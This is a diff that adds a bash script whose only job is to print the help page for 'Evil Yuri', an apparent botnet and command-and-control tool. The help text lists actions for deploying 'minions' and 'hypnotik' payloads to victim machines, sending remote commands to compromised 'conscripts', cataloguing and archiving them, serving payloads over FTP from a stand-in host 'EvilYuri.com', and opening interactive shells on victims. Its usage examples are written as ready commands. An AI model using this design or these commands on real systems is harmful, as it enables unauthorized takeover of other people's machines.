@@ -1,0 +1,265 @@
+#!/bin/bash
+#
+# Regards, the Alveare Solutions society.
+#
+
+cat<<EOF
+# MAN PAGE - EVIL YURI (v1.0 Electromancer)
+
+Options:
+
+-h ,–help                     Display this message.
+
+-f ,–foreground               Keep server attached to terminal.
+
+-t=, –target=                 Target used as context for action. Target can be:
+                              (‘all’, ‘group’, ‘specific’ or ‘attribute’)
+
+-g=, –group=                  Conscript group label for action.
+
+-p=, –protocol=               Communication protocol to use for action.
+                              Currently supported protocols: (‘raw’, ‘ssh’)
+
+-a=, –action=                 Action to execute using given details. Available
+                              actions are: (‘start-minion-listener’,
+                              ‘stop-minion-listener’, ‘deploy-minion’,
+                              ‘deploy-payload’, ‘register-conscript’,
+                              ‘group-conscripts’, ‘archive-conscripts’, ‘panic’,
+                              ‘interogate-conscripts’, ‘search-conscripts’,
+                              ‘mission-instruction’, ‘create-group’,
+                              ‘search-groups’, ‘search-archives’, ‘delete-group’,
+                              ‘delete-archive’, ‘setup-ftp’)
+
+-r= ,–project-root=           Path of the root directory of the project using the
+                              Evil Yuri cargo script.
+
+-d=, –deprecated-archive=     Name of the archive containing deprecated conscript
+                              details.
+
+-m=, –minion-path=            Path to the evil minion script or binary executable.
+                              The minion will be deployed to victim machine in
+                              reconnaissance mode.
+
+-A=, –victim-address=         IPv4 address of hypnotized conscript machines.
+
+-P=, –port-number=            Port number to use for action.
+
+-U=, –-victim-user=           Username created remotely on the conscript
+                              machines by the hypnotik payloads.
+
+-i=, –-victim-identifier=     Label of hypnotized conscript machine.
+
+-I=, –mission-instruction=    Command for conscripts to execute remotely and
+                              return output to. (Currently output is not returned
+                              through raw socket connections)
+
+-K=, –victim-key=             Password or key file path for remote victim user.
+
+-H=, –hypnotik-payload=       Path to payload script or binary executable file.
+
+-c=, –criteria=               Search criteria for database queries. Currently
+                              supported criteria: (‘identifier’, ‘address’,
+                              ‘port’, ‘user’, ‘key’, ‘all’)
+
+-R, –papertrail-reports       Boolean switch (“on” | “off”) that controls the
+                              report generator.
+
+-C=, –ftp-conf=               Path to the ‘vsftpd’ FTP server configuration file
+                              template.
+
+-u=, –ftp-url=                DNS or IPv4 address of the FTP server that
+                              conscripts can connect to and download payloads.
+
+Usage:
+
+[ EXAMPLE ]: Issue mission instruction to hypnotized conscript machines.
+
+./evil-yuri.sh
+    (--action               |-a)='mission-instruction'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--target               |-t)='all'
+    (--port-number          |-P)='8080'
+    (--victim-user          |-U)='conscript'
+    (--victim-key           |-K)='1234'
+    (--mission-instruction  |-I)='echo "Conscript Reporting! - "; uname -a'
+    (--papertrail-reports   |-R)
+- OR - Issue mission instruction to specific conscript machines -
+    (--action               |-a)='mission-instruction'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--target               |-t)='specific'
+    (--victim-address       |-A)='127.0.0.1,127.0.0.2'
+    (--port-number          |-P)='8080'
+    (--victim-user          |-U)='conscript'
+    (--victim-key           |-K)='1234'
+    (--mission-instruction  |-I)='echo "Conscript Reporting! - "; uname -a'
+    (--papertrail-reports   |-R)
+- OR - Issue mission instruction to a group of conscript machines -
+    (--action               |-a)='mission-instruction'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--target               |-t)='group'
+    (--group                |-g)='LinuxMachines'
+    (--port-number          |-P)='8080'
+    (--victim-user          |-U)='conscript'
+    (--victim-key           |-K)='1234'
+    (--mission-instruction  |-I)='echo "Conscript Reporting! - "; uname -a'
+    (--papertrail-reports   |-R)
+
+[ EXAMPLE ]: Start minion listener server
+
+./evil-yuri.sh
+    (--action               |-a)='start-minion-listener'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--protocol             |-p)='raw'
+    (--port_number          |-P)='8080'
+    (--foreground           |-f)
+
+[ EXAMPLE ]: Stop minion listener server
+
+./evil-yuri.sh
+    (--action               |-a)='stop-minion-listener'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--protocol             |-p)='raw'
+    (--port_number          |-P)='8080'
+
+[ EXAMPLE ]: Deploy minion
+
+./evil-yuri.sh
+    (--action               |-a)='deploy-minion'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--protocol             |-p)='raw'
+    (--target               |-t)='specific'
+    (--victim-address       |-A)='127.0.0.1,127.0.0.2'
+    (--port-number          |-P)='8080'
+    (--victim-user          |-U)='conscript'
+    (--victim-key           |-K)='1234'
+    (--ftp-url              |-u)='http://EvilYuri.com'
+    (--minion-path          |-m)='/path/to/evil-minion'
+
+[ EXAMPLE ]: Deploy payload
+
+./evil-yuri.sh
+    (--action               |-a)='deploy-payload'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--protocol             |-p)='ssh'
+    (--target               |-t)='specific'
+    (--victim-address       |-A)='127.0.0.1,127.0.0.2'
+    (--port-number          |-P)='8080'
+    (--victim-user          |-U)='conscript'
+    (--victim-key           |-K)='1234'
+    (--ftp-url              |-u)='http://EvilYuri.com'
+    (--hypnotik-payload     |-H)='/path/to/hypnotik-payload'
+
+[ EXAMPLE ]: Register Conscript
+
+./evil-yuri.sh
+    (--action               |-a)='register-conscript'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--protocol             |-p)='ssh'
+    (--victim-address       |-A)='127.0.0.1'
+    (--port-number          |-P)='8080'
+    (--victim-user          |-U)='conscript'
+    (--victim-key           |-K)='1234'
+    (--ftp-url              |-u)='http://EvilYuri.com'
+    (--victim-identifier    |-i)='conscript1-127-0-0-1-8080-lnx'
+
+[ EXAMPLE ]: Create Conscript Group
+
+./evil-yuri.sh
+    (--action               |-a)='create-group'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--group                |-g)='LinuxMachines'
+
+[ EXAMPLE ]: Group Conscripts
+
+./evil-yuri.sh
+    (--action               |-a)='group-conscripts'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--target               |-t)='specific'
+    (--group                |-g)='LinuxMachines'
+    (--victim-identifier    |-i)='conscript1,conscript2,conscript3'
+[ EXAMPLE ]: Archive Conscripts                                                                                                                                                                                    [21/1892]
+
+./evil-yuri.sh
+    (--action               |-a)='archive-conscripts'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--target               |-t)='specific'
+    (--deprecated-archive   |-d)='Compromised-LinuxMachines'
+    (--victim-identifier    |-i)='conscript1,conscript2'
+
+[ EXAMPLE ]: PANIC
+
+./evil-yuri.sh
+    (--action               |-a)='panic'
+    (--project-root         |-r)='/path/to/project-dir'
+
+[ EXAMPLE ]: Interogate Conscripts
+
+./evil-yuri.sh
+    (--action               |-a)='interogate-conscripts'
+    (--target               |-t)='specific'
+    (--victim-address       |-i)='127.0.0.1,127.0.0.2'
+    (--port-number          |-P)='8080'
+    (--victim-user          |-U)='conscript'
+    (--victim-key           |-K)='1234'
+
+[ EXAMPLE ]: Search Conscripts
+
+./evil-yuri.sh
+    (--action               |-a)='search-conscripts'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--criteria             |-t)='identifier'
+    (--victim-identifier    |-i)='conscript1-label,conscript2-label'
+
+[ EXAMPLE ]: Delete Groups
+
+./evil-yuri.sh
+    (--action               |-a)='delete-group'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--group                |-g)='LinuxMachines'
+
+[ EXAMPLE ]: Delete Archives
+
+./evil-yuri.sh
+    (--action               |-a)='delete-archive'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--deprecated-archive   |-d)='Compromised-LinuxMachines'
+
+[ EXAMPLE ]: Search Groups
+
+./evil-yuri.sh
+    (--action               |-a)='search-groups'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--criteria             |-t)='identifier'
+    (--group                |-g)='group1-label,group2-label'
+
+[ EXAMPLE ]: Search Archives
+
+./evil-yuri.sh
+    (--action               |-a)='search-archives'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--criteria             |-t)='identifier'
+    (--victim-identifier    |-i)='archived-conscript1,archived-conscript2'
+
+[ EXAMPLE ]: Remove Conscripts From Group
+
+./evil-yuri.sh
+    (--action               |-a)='rebase-conscripts'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--victim-identifier    |-i)='conscript1-label,conscript2-label'
+
+[ EXAMPLE ]: Setup FTP server for conscripts to connect to
+
+./evil-yuri.sh
+    (--action               |-a)='setup-ftp'
+    (--ftp-conf             |-C)='/path/to/ftp/server/template.conf'
+
+[ EXAMPLE ]: Open interactive conscript shell
+
+./evil-yuri.sh
+    (--action               |-a)='conscript-commander'
+    (--project-root         |-r)='/path/to/project-dir'
+    (--victim-identifier    |-i)='conscript1-label'
+
+EOF
+
+exit $?
